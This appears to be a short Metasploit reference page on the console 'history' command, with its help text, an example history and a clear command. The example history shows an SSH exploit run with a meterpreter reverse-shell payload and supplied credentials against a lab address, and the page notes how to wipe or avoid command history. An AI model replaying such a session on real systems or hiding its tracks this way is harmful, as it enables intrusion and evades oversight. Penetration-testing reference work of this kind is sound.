# 05 - History

Search Tag(s): #metasploit-framework #command-and-control

## 5.1 - Help Menu

```
msf > history -h
Usage: history [options]

Shows the command history.

If -n is not set, only the last 100 commands will be shown.
If -c is specified, the command history and history file will be cleared.
Start commands with a space to avoid saving them to history.

OPTIONS:

    -a, --all-commands  Show all commands in history.
    -c, --clear         Clear command history and history file.
    -h, --help          Help banner.
    -n <num>            Show the last n commands.
```

## 5.2 - Show Metasploit History Commands

```
msf > history
102  use exploit/multi/ssh/sshexec
103  options
104  show targets
105  set target 1
106  set payload linux/x64/meterpreter/reverse_tcp
107  options
108  set lport 53
109  run username=fox password=pass1234 rhosts=10.0.2.15
..[omitted]..
```

## 5.3 - Clear Metasploit History Commands

```
msf > history -c
```